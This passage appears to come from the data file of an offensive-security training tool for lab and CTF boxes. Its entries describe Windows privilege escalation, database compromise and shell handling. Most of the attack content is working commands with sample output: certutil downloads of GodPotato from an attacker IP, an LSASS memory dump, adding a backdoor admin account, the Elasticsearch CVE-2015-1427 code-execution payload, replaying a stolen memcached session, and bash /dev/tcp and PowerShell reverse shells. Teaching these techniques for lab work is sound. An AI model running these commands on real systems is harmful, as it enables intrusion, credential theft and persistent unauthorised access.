        { where: 'host', tool: 'winpeas', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/winPEASx64.exe wp.exe & wp.exe', output: [
          'CertUtil: -URLCache command completed successfully.',
          'ÉÍÍÍÍ¹ Checking token privileges',
          '    SeImpersonatePrivilege: Enabled',
          'ÉÍÍÍÍ¹ Unquoted Service Paths',
          '    VulnSvc: C:\\Program Files\\Acme Agent\\service.exe',
        ].join('\n') },
      ],
    },
    'seimpersonate': {
      why: "Service accounts (IIS, MSSQL) almost always hold SeImpersonatePrivilege, and that privilege is a straight line to SYSTEM: the \"potato\" exploits trick a privileged service into authenticating, then impersonate its token. Reach for it the instant `whoami /priv` shows SeImpersonate enabled. It is the most reliable Windows service-account escalation there is, so checking your privileges is the first thing to do after a web or database foothold.",
      signal: 'nt authority\\system',
      teach: 'SeImpersonate lets a process impersonate a client that connects to it. The "potato" family (GodPotato, PrintSpoofer) tricks a SYSTEM service into connecting, then steals its token. The potato is an .exe, so the chain is: confirm the privilege, serve the binary from your box, pull it over with certutil and run it, and you are SYSTEM.',
      steps: [
        { where: 'host', tool: 'cmd', cmd: 'whoami /priv | findstr /i impersonate', output: 'SeImpersonatePrivilege        Impersonate a client after authentication  Enabled' },
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding GodPotato-NET4.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'godpotato', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/GodPotato-NET4.exe gp.exe & gp.exe -cmd "cmd /c whoami"', output: [
          '[*] CombaseModule: 0x7ff...',
          '[*] DispatchTable: 0x7ff...',
          '[*] Trigger RPCSS',
          'nt authority\\system',
        ].join('\n') },
      ],
    },
    'unquoted-service-path': {
      why: "When a service's path has spaces and no quotes (C:\\Program Files\\My App\\svc.exe), Windows tries C:\\Program.exe first, then C:\\Program Files\\My.exe, so if you can write to one of those spots you choose what runs as SYSTEM. Reach for it when enumeration lists an unquoted path you can write into. It is a tidy classic, the catch is needing write access to the right folder, so verify that before building the payload.",
      cmd: 'wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "c:\\windows\\\\"', tool: 'sh',
      output: [
        'VulnSvc    C:\\Program Files\\Acme Agent\\service.exe    Auto',
      ].join('\n'),
      signal: 'VulnSvc    C:\\Program Files\\Acme Agent\\service.exe    Auto',
      teach: 'An unquoted service path with spaces lets Windows try C:\\Program.exe, then C:\\Program Files\\Acme.exe, before the real binary. If you can write to one of those directories, drop your payload there and the service runs it, often as SYSTEM.',
    },
    'weak-service-permissions': {
      why: "If you can change a service's configuration or overwrite its executable, you decide what runs as SYSTEM the next time it starts, by pointing it at your own binary. accesschk finds services whose ACLs you can write. Reach for it when enumeration flags a modifiable service. Note you usually need to trigger a restart (or wait for a reboot), so part of the exploit is getting the service to start again.",
      signal: '        SERVICE_ALL_ACCESS',
      teach: 'accesschk (a Sysinternals .exe) finds services whose ACLs you can write, but you have to stage it first: serve it from your box, pull it over with certutil, then run it. SERVICE_ALL_ACCESS over a service means you can rewrite its binary path (sc config VulnSvc binpath= ...) to run any command and restart it, code execution as the service account, usually SYSTEM.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding accesschk.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'accesschk', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/accesschk.exe ac.exe & ac.exe -uwcqv someuser VulnSvc /accepteula', output: [
          'CertUtil: -URLCache command completed successfully.',
          'VulnSvc',
          '  RW someuser',
          '        SERVICE_ALL_ACCESS',
        ].join('\n') },
      ],
    },
    'alwaysinstallelevated': {
      why: "This is a free SYSTEM shell hiding in a policy almost nobody means to enable. With the feature on, Windows installs any MSI you hand it at full SYSTEM rights, so a one-line package that adds an admin or runs your command is game over. The catch is that both the HKLM and HKCU keys must read 1, one alone does nothing, which is exactly the pair winpeas confirms for you.",
      cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', tool: 'sh',
      output: [
        'HKLM\\...\\Installer',
        '    AlwaysInstallElevated    REG_DWORD    0x1',
        '# HKCU is also 0x1',
      ].join('\n'),
      signal: '    AlwaysInstallElevated    REG_DWORD    0x1',
      teach: 'When AlwaysInstallElevated is 0x1 in BOTH HKLM and HKCU, any MSI you install runs as SYSTEM. Build a malicious MSI (msfvenom -f msi), run msiexec, and you escalate, a pure misconfiguration, no exploit needed.',
    },
    'dpapi-secrets': {
      why: "This is how you turn being a user into holding everything that user ever saved. Windows locks stored RDP, scheduled-task, and browser credentials behind DPAPI masterkeys that are themselves sealed by the account's password hash, so the moment you own the user (or SYSTEM) the whole vault opens. Reach for it once you have an account and suspect saved secrets, because what falls out is frequently the credential for a more privileged account.",
      cmd: "impacket-dpapi credential -file C:\\Users\\dev\\AppData\\...\\Credentials\\A1B2 -key 0x...", tool: 'impacket-dpapi',
      output: [
        '[CREDENTIAL]',
        'Target: LegacyGeneric:target=git',
        'Username: svc_build',
        'Unknown3: Bu1ld!2023',
      ].join('\n'),
      signal: 'Unknown3: Bu1ld!2023',
      teach: 'Windows DPAPI encrypts saved browser and app passwords with a key derived from the user\'s login. With that user\'s context (or their masterkey) you decrypt the blobs and recover cleartext credentials, often for other systems the user accessed.',
    },
    'stored-credentials': {
      why: "Windows hoards credentials in predictable places: Credential Manager, autologon registry entries, unattend and sysprep answer files, saved .rdp files, browser vaults, mRemoteNG configs. Reach for it on every Windows foothold, because a found credential beats any exploit and frequently belongs to a more privileged account. The skill is knowing the dozen places to look, so run through them deliberately rather than hoping winpeas catches them all.",
      cmd: 'cmdkey /list', tool: 'sh',
      output: [
        'Currently stored credentials:',
        '    Target: Domain:interactive=ACME\\administrator',
        '    Type: Domain Password',
      ].join('\n'),
      signal: '    Target: Domain:interactive=ACME\\administrator',
      teach: 'Windows caches credentials for convenience. cmdkey /list shows stored logins you can reuse with runas /savecred, sometimes an Administrator credential is sitting there for the taking, no cracking needed.',
    },
    'windows-old-hives': {
      why: "Sometimes the credentials you need were never in memory at all, just left behind on disk. A half-finished upgrade or a lazy backup leaves copies of the account database where an ordinary user can read them, and what is inside is frequently still live. You carry those files back to Kali and open them there, offline, well away from any protected process or endpoint sensor. It is the quietest route to local admin there is, and the thing to look for first is a stray upgrade folder or a backup share.",
      cmd: 'dir C:\\Windows.old\\Windows\\System32\\config', tool: 'sh',
      output: [
        'Directory of C:\\Windows.old\\Windows\\System32\\config',
        '01/08/2024  09:12            65,536 SAM',
        '01/08/2024  09:12         9,437,184 SYSTEM',
      ].join('\n'),
      signal: '01/08/2024  09:12            65,536 SAM',
      teach: 'A Windows.old folder from an in-place upgrade keeps old registry hives (SAM and SYSTEM) that a low-priv user can often read. Pull them and dump offline (secretsdump) for the local Administrator hash, then pass it.',
    },
    'wesng-patch-gaps': {
      why: "Older Windows hosts (2008, 2012, 7) are often escalated by a missing kernel patch rather than a misconfiguration, and wesng maps the gaps: feed it `systeminfo` and it lists the missing patches with matching exploits. Reach for it when the box is old and the misconfiguration checks came up empty. Treat its output as candidates to verify, because a kernel exploit can crash the box, so weigh the risk before firing one on something you need stable.",
      cmd: 'systeminfo', tool: 'sh',
      output: [
        'OS Name:          Microsoft Windows Server 2016 Standard',
        'OS Version:       10.0.14393 N/A Build 14393',
        'Hotfix(s):        3 Hotfix(s) Installed.',
      ].join('\n'),
      signal: 'OS Version:       10.0.14393 N/A Build 14393',
      teach: 'systeminfo gives the exact build and installed hotfixes. Feed it to wesng (Windows Exploit Suggester) and it lists the kernel exploits the box is missing. Confirm the build and architecture before running one, a wrong kernel exploit bluescreens the target.',
    },
    'windows-persistence': {
      why: "With admin or SYSTEM, persistence leaves a route back: a local admin account you control, a scheduled task, or a Run key. Labs rarely need it, but long engagements do, and it is a legitimate report note on real work. Reach for it only after you hold privilege and need durable access. Like the Linux case, it is optional on a short box but worth understanding as a technique and as something defenders watch for.",
      cmd: "net user obol_svc 'Str0ng!Passw0rd' /add && net localgroup administrators obol_svc /add", tool: 'sh',
      output: [
        'The command completed successfully.',
        'The command completed successfully.',
      ].join('\n'),
      signal: 'The command completed successfully.',
      teach: 'A local admin account you add is a durable way back onto a Windows box after a revert or reboot. On a real engagement this is scoped, logged, and cleaned up afterward; note what you create so you can remove it.',
    },
    'lsass-dump-onbox': {
      why: "The appeal is scope: one dump of a single process hands you the credentials of everyone currently signed in, which on a shared box can include a domain admin. With admin or SYSTEM you capture LSASS memory using the built-in comsvcs.dll (nothing uploaded), ship the .dmp to Kali, and parse it with pypykatz for hashes, tickets, and sometimes plaintext. Reach for it once you are admin and want to harvest further up the chain.",
      cmd: 'rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full', tool: 'cmd',
      output: [
        '# dump written; parse offline with pypykatz:',
        'Username: administrator   NT: 2b576acbe6b...',
      ].join('\n'),
      signal: 'Username: administrator   NT: 2b576acbe6b...',
      teach: 'LSASS holds the credentials of everyone logged in. With local admin you dump its memory and parse it offline (pypykatz) for NTLM hashes, including, on a shared box, domain admins. Those hashes feed pass-the-hash and lateral movement.',
    },
    'defense-enum': {
      why: "Before running anything loud on a Windows host, find out what is watching: PowerShell language mode, Defender's real-time state and its exclusion paths, any AppLocker policy. Reach for it first on any Windows foothold, because a Defender exclusion path is literally a folder where your tools will not be scanned, and the language mode tells you whether your PowerShell will even run. It is reconnaissance that shapes every later choice.",
      cmd: 'powershell -c "$ExecutionContext.SessionState.LanguageMode"', tool: 'powershell',
      output: [
        'ConstrainedLanguage',
      ].join('\n'),
      signal: 'ConstrainedLanguage',
      teach: 'Before you throw tooling at a Windows box, learn what is watching: Constrained Language Mode, AppLocker, and real-time protection all change what will run. Knowing the constraints up front saves you from burning a shell on something that was never going to execute.',
    },

    // ============================ DATABASES ============================
    'mysql-login': {
      why: "A reachable MySQL frequently accepts a credential you already found, a blank root password, or reused creds, and a session in is the door to the schema and, more importantly, the application's own user and password tables. Reach for it whenever you have a MySQL port and any plausible credential. Getting in is usually the easy part; the value is what the application stored in its own tables.",
      cmd: "mysql -h 10.10.10.10 -u root -p'toor' -e 'SELECT version();'", tool: 'mysql',
      output: [
        '+-------------------------+',
        '| version()               |',
        '+-------------------------+',
        '| 5.7.33-0ubuntu0.16.04.1 |',
        '+-------------------------+',
      ].join('\n'),
      signal: '| 5.7.33-0ubuntu0.16.04.1 |',
      teach: 'A successful MySQL login is a foothold of its own: from SQL you can read application secrets, write files to the web root with INTO OUTFILE, and sometimes reach the OS. Confirm the version first, it steers what is possible.',
    },
    'mysql-loot': {
      why: "A database login is only half a win; the credentials inside it are the other half. Every application stores its own user table, and those password hashes crack or, just as often, reuse straight onto the box or the domain. So the moment you are in, go after the user tables, because this is where a database foothold quietly becomes a real account somewhere that matters.",
      cmd: "mysql -h 10.10.10.10 -u root -p'toor' -e 'SELECT user,host,authentication_string FROM mysql.user;'", tool: 'mysql',
      output: [
        '+------------------+------+-------------------------------------------+',
        '| user             | host | authentication_string                     |',
        '+------------------+------+-------------------------------------------+',
        '| root             | %    | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |',
        '| webapp           | %    | *A3F91C7E42B8D06FADE1559C7B2048E6D1C3A9F0 |',
        '+------------------+------+-------------------------------------------+',
      ].join('\n'),
      signal: '| root             | %    | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |',
      teach: 'Once you have a DB session, the mysql.user table holds every account\'s password hash (mode 300 for the *HEX form). Dump them and crack offline, database passwords are reused as system and domain passwords all the time.',
    },
    'mssql-login': {
      why: "On Windows, a SQL login is rarely the destination; it is the on-ramp to command execution. MSSQL happily takes a domain credential or a weak sa account, and once you are at the prompt the real question is how much privilege you hold, because sysadmin turns the database into a shell. Reach for it whenever you see MSSQL and hold any credential, and treat logging in as step one toward a Windows foothold, not the finish line.",
      cmd: 'mssqlclient.py acme.internal/svc_sql:P@ssw0rd2023@10.10.10.10 -windows-auth', tool: 'mssqlclient.py',
      output: [
        '[*] Encryption required, switching to TLS',
        '[*] ACME\\svc_sql  guest@master',
        "SQL> SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;",
        'is_sysadmin : 1',
      ].join('\n'),
      signal: 'is_sysadmin : 1',
      teach: 'The first thing to check on an MSSQL login is IS_SRVROLEMEMBER(\'sysadmin\'). A 1 means you can re-enable xp_cmdshell and run OS commands, or impersonate other logins. Sysadmin on MSSQL is effectively a shell on the host.',
    },
    'mssql-xp-cmdshell': {
      why: "This is the cleanest database-to-shell jump Windows offers, and it comes with a bonus. Sysadmin lets you switch on a stored procedure that runs OS commands as the SQL service account, and that account very often holds SeImpersonate, which is a straight line onward to SYSTEM. So the instant you confirm sysadmin rights on MSSQL, this is the move: a shell now and a privesc teed up for next.",
      cmd: "mssqlclient.py ...@10.10.10.10 -q \"EXEC xp_cmdshell 'whoami'\"", tool: 'mssqlclient.py',
      output: [
        'output',
        '--------------------------------',
        'nt service\\mssqlserver',
      ].join('\n'),
      signal: 'nt service\\mssqlserver',
      teach: 'With sysadmin on MSSQL you re-enable xp_cmdshell and run OS commands as the SQL service account. The whoami output confirms code execution, the database just became a shell. From here, grab a reverse shell.',
    },
    'postgres-login': {
      why: "With PostgreSQL the server version decides whether a login is a data leak or a shell. A default or reused credential gets you in, and from there the command-execution paths (COPY FROM PROGRAM, large-object tricks) live or die on how old the build is. So read the version first, then enumerate: the very same session is either rows of data or a route to RCE depending on that one number.",
      cmd: "PGPASSWORD=postgres psql -h 10.10.10.10 -U postgres -c 'SELECT version();'", tool: 'psql',
      output: [
        '                         version',
        '--------------------------------------------------------------',
        ' PostgreSQL 13.3 on x86_64-pc-linux-gnu, compiled by gcc 10.2',
        '(1 row)',
      ].join('\n'),
      signal: ' PostgreSQL 13.3 on x86_64-pc-linux-gnu, compiled by gcc 10.2',
      teach: 'A PostgreSQL session with the right role can read files and, via COPY ... FROM PROGRAM, run commands. As with any DB foothold, the version tells you which of those paths is open to you.',
    },
    'redis-enum': {
      why: "Redis is a key-value store people forget to lock, and an open one gives up its contents for free. Read first: cached sessions, tokens, and secrets sit in plain view behind a couple of commands, and that alone often unlocks the next step. Then, if the instance is writable and you know a path on disk, that same access escalates from reading secrets to writing an SSH key or a webshell, which is code execution.",
      cmd: 'redis-cli -h 10.10.10.10 INFO server', tool: 'redis-cli',
      output: [
        '# Server',
        'redis_version:6.0.16',
        'os:Linux 5.15.0-79-generic x86_64',
        'config_file:/etc/redis/redis.conf',
      ].join('\n'),
      signal: 'redis_version:6.0.16',
      teach: 'An unauthenticated Redis answers INFO to anyone. Beyond the version, a writable Redis can be abused to drop an SSH key or a web shell (CONFIG SET dir / dbfilename), an open Redis on 6379 is frequently a direct foothold.',
    },
    'mongo-enum': {
      why: "There is nothing clever about this one, which is exactly why it works so often: a Mongo instance left unauthenticated simply hands you its data when you ask. No injection, no cracking, just connecting and reading what should have been locked down. Enumerate the collections and mine them for stored credentials and anything that opens the next door; it is pure misconfiguration, and misconfiguration is everywhere.",
      cmd: 'nmap -Pn -p 27017 --script mongodb-info,mongodb-databases 10.10.10.10', tool: 'nmap',
      output: [
        'PORT      STATE SERVICE',
        '27017/tcp open  mongodb',
        '| mongodb-databases:',
        '|   admin   users   app_secrets',
        '|_  (no authentication required)',
      ].join('\n'),
      signal: '|_  (no authentication required)',
      teach: 'MongoDB historically shipped with no authentication. If you can list databases without credentials, you can read them, app_secrets and users collections often hold password hashes or API keys outright.',
    },
    'oracle-tns': {"why": "Oracle is the database people skip because its tooling is unfamiliar, and that is exactly why it rewards you: the box author left it in precisely because most students flinch and move on. The whole service hides behind a System ID, a name you must know before any login will even be attempted, so a listener that leaks it or lets you brute it is the first domino. Oracle's recurring sin is the pile of default accounts nobody ever removes, and one working login is seldom just data: a privileged account can reach the host filesystem, which is the quiet route from a query prompt to a shell. Lean on odat so you are not fighting unfamiliar sqlplus syntax while the clock runs.", "cmd": "nmap -sV -p1521 --script oracle-sid-brute 10.10.10.10", "tool": "nmap", "output": "PORT     STATE SERVICE VERSION\n1521/tcp open  oracle-tns Oracle TNS Listener 11.2.0.2.0 (unauthorized)\n| oracle-sid-brute:\n|_  ORCL", "signal": "|_  ORCL", "teach": "The SID brute returned ORCL, the one thing a login needs. Try default accounts against it with odat (system/manager, scott/tiger, dbsnmp/dbsnmp); a privileged hit then reads and writes host files.", "leadup": [{"key": "scan", "label": "The scan found 1521", "steps": [{"title": "Spot the Oracle listener", "tool": "nmap", "where": "local", "cmd": "nmap -p 1521 <target>", "out": "1521/tcp open  oracle", "sig": "1521/tcp open  oracle", "teach": "1521 is the Oracle TNS listener; everything starts with learning the SID, because no login works without it."}]}, {"key": "version", "label": "The listener leaked its version", "steps": [{"title": "Fingerprint the listener", "tool": "nmap", "where": "local", "cmd": "nmap -sV -p 1521 <target>", "out": "1521/tcp open  oracle-tns  Oracle TNS Listener 11.2.0.2.0", "sig": "Oracle TNS Listener 11.2.0.2.0", "teach": "The version decides your tooling; an 11g listener sits squarely in odat's wheelhouse for SID and password guessing."}]}], "how": {"lead": "Oracle is three steps: get the SID, get a login, then use the privilege. odat does the first two for you.", "items": [{"t": "Find the SID", "d": "A login needs a System ID. odat sidguesser brute-forces it from a built-in list when the listener will not disclose it outright.", "demo": [{"run": "odat sidguesser -s <target> -p 1521", "out": "[+] SID found: ORCL\n[+] SID found: XE", "sig": "SID found: ORCL"}], "note": "Without a SID you cannot even attempt a login; two were found here, so try the likelier one first."}, {"t": "Guess the default accounts", "d": "Oracle ships with dozens of default accounts that are rarely removed. odat passwordguesser tries the documented pairs against your SID.", "demo": [{"run": "odat passwordguesser -s <target> -p 1521 -d ORCL --accounts-file accounts/accounts.txt", "out": "[+] Valid credentials: scott/tiger\n[+] Valid credentials: system/manager", "sig": "Valid credentials: scott/tiger"}], "note": "scott/tiger is the textbook Oracle default; system/manager is a DBA account and far more useful."}, {"t": "Log in and read your privileges", "d": "sqlplus opens a session with a working credential. Read the version and your role to know whether file access is possible.", "demo": [{"run": "sqlplus system/manager@<target>:1521/ORCL", "out": "Connected to:\nOracle Database 11g Enterprise Edition\nSQL> ", "sig": "Oracle Database 11g Enterprise Edition"}], "note": "A SQL prompt as system means DBA; that privilege is the key to the filesystem."}, {"t": "Turn a DBA login into files or a shell", "d": "A privileged account reads and writes host files through odat (utlfile, externaltable) and on many versions runs commands. Read a known file first to prove the privilege.", "demo": [{"run": "odat utlfile -s <target> -d ORCL -U system -P manager --getFile /etc passwd passwd", "out": "[+] Reading the /etc/passwd file\n[+] /etc/passwd successfully downloaded", "sig": "successfully downloaded"}], "note": "A confirmed file read means the same primitive writes a webshell or a cron job for code execution."}]}},
    'elasticsearch-enum': {"why": "Elasticsearch is a search and log store, which means it is where an application quietly keeps the things it searches over: every log line, every user record, every indexed document. Teams stand it up for an internal dashboard and forget it answers plain HTTP to anyone who asks, so the attack is usually just curl. Read the version first, because it splits your approach cleanly in two. A current build is a data-reading exercise: list the indices and dump whichever one looks like users or config. An ancient one, from the Groovy and MVEL era, adds a documented remote code execution through the search scripting engine on top. Either way there is no login standing in your path.", "cmd": "curl -s http://10.10.10.10:9200/_cat/indices?v", "tool": "curl", "output": "health status index          docs.count store.size\ngreen  open   employees      1452       3.1mb\ngreen  open   app-logs       98217      210mb\ngreen  open   .kibana        1          12kb", "signal": "green  open   employees      1452       3.1mb", "teach": "The _cat/indices view listed every index and its document count with no authentication. 'employees' is 1452 records of likely PII and credentials; dump it with /employees/_search?pretty and mine the documents.", "leadup": [{"key": "scan", "label": "The scan found 9200", "steps": [{"title": "Spot the Elasticsearch port", "tool": "nmap", "where": "local", "cmd": "nmap -p 9200 <target>", "out": "9200/tcp open  wap-wsp", "sig": "9200/tcp open  wap-wsp", "teach": "9200 is Elasticsearch's HTTP API (nmap often mislabels it wap-wsp); curl its root to confirm and read the version."}]}, {"key": "banner", "label": "The banner named Elasticsearch", "steps": [{"title": "Read the API root", "tool": "curl", "where": "local", "cmd": "curl -s http://<target>:9200/", "out": "{\n  \"name\" : \"es01\",\n  \"version\" : { \"number\" : \"6.8.0\" },\n  \"tagline\" : \"You Know, for Search\"\n}", "sig": "You Know, for Search", "teach": "The tagline confirms Elasticsearch and the version decides your path; 6.8 is modern, so this is a data read, not an RCE."}]}], "how": {"lead": "Elasticsearch is HTTP and JSON, so curl is the whole toolkit. Version, indices, dump.", "items": [{"t": "Confirm the service and version", "d": "A GET to the root returns a JSON banner with the version. That number decides whether you are only reading data or also chasing an RCE.", "demo": [{"run": "curl -s http://<target>:9200/", "out": "{\n  \"version\" : { \"number\" : \"1.4.2\" },\n  \"tagline\" : \"You Know, for Search\"\n}", "sig": "\"number\" : \"1.4.2\""}], "note": "1.4.2 predates the Groovy sandbox fix, so CVE-2015-1427 RCE is on the table alongside the data."}, {"t": "List the indices", "d": "_cat/indices?v prints every index with a document count, so you see at a glance where the data lives.", "demo": [{"run": "curl -s http://<target>:9200/_cat/indices?v", "out": "health status index      docs.count\ngreen  open   users       341\ngreen  open   wordpress   27", "sig": "users       341"}], "note": "A 'users' index is the obvious target; dump it next."}, {"t": "Dump an index", "d": "_search with a size returns the stored documents as JSON. Pipe it through jq or grep for the fields that matter.", "demo": [{"run": "curl -s 'http://<target>:9200/users/_search?pretty&size=50'", "out": "        \"_source\" : {\n          \"user\" : \"admin\",\n          \"pass_hash\" : \"$2y$10$Dq...\"\n        }", "sig": "\"user\" : \"admin\""}], "note": "Usernames and bcrypt hashes straight out of the index; crack them offline."}, {"t": "On old versions, escalate to RCE", "d": "Before 1.3.8 and in 1.4.0 to 1.4.2 the Groovy scripting sandbox can be bypassed (CVE-2015-1427); much older pre-1.2 installs ran attacker scripts outright (MVEL, CVE-2014-3120). The bypass reaches Runtime.exec through reflection.", "demo": [{"run": "curl -s -XPOST 'http://<target>:9200/_search?pretty' -d '{\"script_fields\":{\"x\":{\"lang\":\"groovy\",\"script\":\"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}}'", "out": "          \"fields\" : {\n            \"x\" : [ \"uid=108(elasticsearch) gid=113(elasticsearch)\" ]\n          }", "sig": "uid=108(elasticsearch)"}], "note": "Only on vulnerable versions; it runs as the service's own low-priv user, so this is a foothold, not root."}]}},
    'memcached-enum': {"why": "Memcached is easy to walk past because it holds nothing permanent: it is a cache, and a cache feels like scratch space rather than a target. That instinct is wrong. Whatever the application needed to be fast, it put here, and for a lot of apps that means live session identifiers and the occasional credential, sitting in plaintext with no login in front of them. The catch is that the protocol does not hand you a tidy listing, you have to walk it: ask which slabs hold items, dump the keys in each slab, then fetch the values one key at a time. It is a few minutes of a text protocol over a raw socket, and the payoff is sometimes an active session you replay straight into the app.", "cmd": "nmap -p11211 --script memcached-info 10.10.10.10", "tool": "nmap", "output": "PORT      STATE SERVICE\n11211/tcp open  memcache\n| memcached-info:\n|   Process ID: 2345\n|   Uptime: 60209 seconds\n|   Current connections: 3\n|   Version: 1.5.6\n|_  Architecture: 64-bit", "signal": "|   Version: 1.5.6", "teach": "memcached-info confirms an unauthenticated memcached 1.5.6; it does not list items, so connect with ncat and walk it: 'stats items' names the slabs, 'stats cachedump <slab> 0' lists keys, 'get <key>' reads a value.", "leadup": [{"key": "scan", "label": "The scan found 11211", "steps": [{"title": "Spot the memcached port", "tool": "nmap", "where": "local", "cmd": "nmap -p 11211 <target>", "out": "11211/tcp open  memcache", "sig": "11211/tcp open  memcache", "teach": "11211 is memcached, an unauthenticated cache; the only question is what the application left in it."}]}, {"key": "udp", "label": "Exposed on UDP too", "steps": [{"title": "Check the UDP port", "tool": "nmap", "where": "local", "cmd": "sudo nmap -sU -p 11211 <target>", "out": "11211/udp open  memcache", "sig": "11211/udp open  memcache", "teach": "Memcached on UDP is also the classic amplification vector, but for reading the cache the TCP text protocol is your way in."}]}], "how": {"lead": "Memcached has no listing command, so you walk it: slabs, then keys, then values.", "items": [{"t": "Read the stats", "d": "A quick stats read tells you whether anything is cached and which version you face, without typing the protocol by hand.", "demo": [{"run": "memcstat --servers=<target>", "out": "Server: <target> (11211)\n   curr_items: 42\n   version: 1.5.6", "sig": "curr_items: 42"}], "note": "Non-zero curr_items means there is something to dump; zero means move on."}, {"t": "List the slabs that hold items", "d": "Connect with ncat and send 'stats items'. Each line names a slab class and how many items it holds.", "demo": [{"run": "ncat <target> 11211", "out": "stats items\nSTAT items:1:number 12\nSTAT items:2:number 30\nEND", "sig": "STAT items:1:number 12"}], "note": "Slab 1 holds 12 items; you dump keys per slab, so note the slab numbers."}, {"t": "Dump the keys in a slab", "d": "'stats cachedump <slab> 0' lists every key in that slab (0 means no limit). These are the names you will fetch.", "demo": [{"run": "stats cachedump 1 0", "out": "ITEM session:9f3a2b [46 b; 1704708000 s]\nITEM csrf:abc [40 b; 1704708000 s]\nEND", "sig": "ITEM session:9f3a2b"}], "note": "A 'session:' key is a live session token, the highest-value thing in the cache."}, {"t": "Read the value", "d": "'get <key>' returns the cached value. A session blob is replayed into the app as that user; a credential is used directly.", "demo": [{"run": "get session:9f3a2b", "out": "VALUE session:9f3a2b 0 46\n{\"uid\":1,\"user\":\"admin\",\"role\":\"administrator\"}\nEND", "sig": "\"role\":\"administrator\""}], "note": "An admin session object: set this token in your browser and you are logged in as admin, no password needed."}]}},


    // ============================ SHELLS & TRANSFER ============================
    'ssh-key-login': {
      why: "Prefer a looted key over any other way onto the box: it needs no cracking and no noisy guessing, and the session it hands you is a proper login that survives reboots and outlasts any callback. So the instant a PEM file turns up, treat getting onto the service as your next move. The only judgement call left is identity, match the file to an account from where it was stored and who the machine belongs to.",
      cmd: 'chmod 600 id_rsa && ssh -i id_rsa -o StrictHostKeyChecking=no bob@10.10.10.10', tool: 'ssh',
      output: [
        'Last login: Mon Jan  1 10:00:00 2024 from 10.10.14.5',
        'bob@target:~$ id',
        'uid=1000(bob) gid=1000(bob) groups=1000(bob)',
      ].join('\n'),
      signal: 'bob@target:~$ id',
      teach: 'A private key you looted is a password-free login, but SSH refuses a key others can read, hence chmod 600. A stable SSH session beats any reverse shell: it has a real TTY and survives. Try looted keys against every user and host.',
    },
    'shell-listener': {
      why: "This is the half people skip, then burn a working exploit wondering why nothing came back. Make it a fixed habit: bring the catcher up and confirm it is bound before you trigger anything that dials home. Order is the whole lesson, because a connection that arrives with nothing holding the port is gone for good and you have to re-fire the bug. Wrap it in rlwrap from the start so what you catch has history and arrow keys, not a raw prompt you will want to redo.",
      cmd: 'rlwrap nc -lvnp 4444', tool: 'rlwrap',
      output: [
        'listening on [any] 4444 ...',
      ].join('\n'),
      signal: 'listening on [any] 4444 ...',
      teach: 'Before you fire a reverse shell, start the catcher. nc -lvnp 4444 listens; wrapping it in rlwrap gives you command history and arrow keys once the shell lands. Set the listener first, a callback with nothing listening is lost.',
    },
    'shell-revshell-linux': {
      why: "The moment you can run even one command on a Linux box, this is how you trade that foothold for hands-on access you can actually work from. The skill that matters is picking a payload the box can run: a stripped target may have no bash and no python, only sh, perl, or nc, so carry two or three fallbacks and match them to what enumeration proved is installed. An unreliable bug is often your one shot, do not waste it on a payload the machine cannot execute.",
      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
      teach: 'Start the listener FIRST, then deliver the payload on the target (through a web bug, a cron, an upload). It dials back and your listener catches it, code execution becoming an interactive shell. The prompt is raw; upgrade it to a PTY next.',
      steps: [
        { where: 'local', tool: 'nc', cmd: 'rlwrap nc -lvnp 4444', output: 'listening on [any] 4444 ...' },
        { where: 'host', tool: 'bash', cmd: "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'", output: [
          '↩ caught back on your listener:',
          'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
          'www-data@target:/var/www/html$ id',
          'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
        ].join('\n') },
      ],
    },
    'shell-revshell-windows': {
      why: "On a Windows box you can already run code on, this trades one-shot commands for a live prompt. The wrinkle that Linux does not have is the defender sitting in the way: a stock one-liner is often flagged on sight, so the real work is knowing a couple of quieter variants and reading your defense-enum notes for AV state and exclusion paths before you fire. Land it and you arrive as whatever account the service runs under, usually the start of Windows privilege work, not the end.",
      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
      teach: 'Same two beats as a Linux reverse shell: listener on your box first, then run the PowerShell payload on the target. It calls back and you land as the service account the web app runs under; next comes Windows enumeration.',
      steps: [
        { where: 'local', tool: 'nc', cmd: 'rlwrap nc -lvnp 4444', output: 'listening on [any] 4444 ...' },
        { where: 'host', tool: 'powershell', cmd: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);...\"", output: [
          '↩ caught back on your listener:',
          'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
          'PS C:\\> whoami',
          'acme\\svc_web',
        ].join('\n') },
      ],
    },
    'shell-pty-upgrade': {
      why: "Do this first, before you touch anything interactive. A raw catch will hang or die the instant you run su, ssh, or an editor, and one stray Ctrl-C kills the whole session instead of the command. The upgrade is a fixed two-part ritual (spawn a pty on the target, then repair your own terminal with stty) that costs ten seconds and removes a whole category of mid-engagement frustration, so bake it into muscle memory rather than reaching for it only after something breaks.",
      signal: 'www-data@target:/$ export TERM=xterm',
      teach: 'A raw netcat shell has no job control, no arrows, no tab-complete, and dies on Ctrl-C. The fix is two-sided: spawn a PTY inside the shell, then background it with Ctrl-Z and fix YOUR terminal with stty before foregrounding. Do it before anything interactive, like su or ssh.',
      steps: [
        { where: 'host', tool: 'python3', cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", output: [
